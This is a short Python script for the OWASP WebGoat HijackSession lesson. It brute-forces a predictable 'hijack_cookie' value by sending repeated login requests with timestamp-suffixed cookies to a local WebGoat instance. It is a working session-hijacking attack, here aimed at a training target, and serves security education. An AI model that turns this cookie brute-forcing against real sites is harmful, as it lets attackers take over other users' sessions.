##################################################
## Python script for use in brute forcing a valid hijack cookie for OWASP WebGoat HiJackSession lession
##################################################
## Author: Micah Wieburg
## License: MIT License
## Copyright: Copyright (c) 2024 mwieburg

import requests
import sys

#set body content of post request to login page
body = {'username':'&',
	'password':''
       }
try:
   #set variable values for post request headers
   timestart = int(sys.argv[1])
   timeend = int(sys.argv[2])
   sessionID = sys.argv[3]
   #check if cookie value was passed to script and set variable if value supplied
   if len(sys.argv) > 4:
     cookie = sys.argv[4]
   else:
      cookie = None

   #begin loop for brute force range
   for i in range(timestart,timeend):
    if cookie is None:
     #set headers object for post request without hijack cookie
     headers = {
		 'Accept': '*/*',
		 'Accept-Encoding':'gzip, deflate, br',
		 'Accept-Language':'en-US,en;q=0.5',
		 'Connection':'keep-alive',
		 'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
		 'Cookie':'JSESSIONID='+str(sessionID),
		 'Origin':'http://localhost:8080',
		 'Referer':'http://localhost:8080/WebGoat/start.mvc',
		 'Sec-Fetch-Dest':'empty',
		 'Sec-Fetch-Mode':'cors',
		 'Sec-Fetch-Site':'same-origin',
		 'User-Agent':'any',
		 'X-Requested-With':'XMLHttpRequest',
      }
    else:
      #set headers object for post request with hijack cookie
      headers = {
		 'Accept': '*/*',
		 'Accept-Encoding':'gzip, deflate, br',
		 'Accept-Language':'en-US,en;q=0.5',
		 'Connection':'keep-alive',
		 'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
		 'Cookie':'JSESSIONID='+str(sessionID)+';hijack_cookie='+cookie+'-'+str(i),
		 'Origin':'http://localhost:8080',
		 'Referer':'http://localhost:8080/WebGoat/start.mvc',
		 'Sec-Fetch-Dest':'empty',
		 'Sec-Fetch-Mode':'cors',
		 'Sec-Fetch-Site':'same-origin',
		 'User-Agent':'any',
		 'X-Requested-With':'XMLHttpRequest',
       }
    #send post request to login url and print headers and data to console
    response = requests.post('http://localhost:8080/WebGoat/HijackSession/login',data=body,timeout=5, headers=headers)
    data = response.json()
    print(response.headers)
    print(data)
except Exception as error:
  print("An exception occured:", error)
